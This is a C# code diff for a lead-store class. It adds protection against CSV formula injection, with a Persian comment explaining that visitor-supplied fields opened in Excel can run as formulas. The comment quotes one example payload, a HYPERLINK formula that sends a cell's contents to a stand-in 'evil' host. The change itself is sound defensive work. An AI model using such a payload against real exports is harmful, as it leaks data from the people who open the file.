@@ -164,11 +164,29 @@ public sealed class LeadStore
             return true;
         });
 
-    /// <summary>خروجی CSV — با BOM تا اکسل فارسی را درست نشان بدهد.</summary>
+    /// <summary>
+    /// خروجی CSV — با BOM تا اکسل فارسی را درست نشان بدهد.
+    ///
+    /// نکته‌ی امنیتی: محتوای این فایل را *بازدیدکننده‌ها* می‌نویسند (فرم تماس
+    /// عمومی است) و بعد مدیر آن را در اکسل باز می‌کند. اکسل هر سلولی را که با
+    /// = یا + یا - یا @@ شروع شود «فرمول» می‌فهمد و اجرا می‌کند — حتی وقتی
+    /// سلول داخل گیومه باشد. یعنی یک نفر می‌توانست در فیلد نام
+    /// `=HYPERLINK("http://evil/"&amp;A1,"باز کن")` بنویسد و روی کامپیوترِ
+    /// مدیر اجرا شود. راه‌حل استاندارد (توصیه‌ی OWASP): یک آپاستروف پیش از
+    /// این کاراکترها که اکسل آن را «این سلول متن است» می‌فهمد و نمایش هم
+    /// نمی‌دهد.
+    /// </summary>
     public static string ToCsv(IEnumerable<Lead> leads)
     {
         var fa = new CultureInfo("fa-IR");
-        string Esc(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";
+
+        string Esc(string s)
+        {
+            var v = s ?? "";
+            if (v.Length > 0 && (v[0] is '=' or '+' or '-' or '@' or '\t' or '\r'))
+                v = "'" + v;
+            return "\"" + v.Replace("\"", "\"\"") + "\"";
+        }
 
         var headers = new[] { "تاریخ", "نام", "راه ارتباطی", "کسب‌وکار", "حوزه", "نیاز", "پیگیری شد" };
         var lines = new List<string> { string.Join(",", headers.Select(Esc)) };
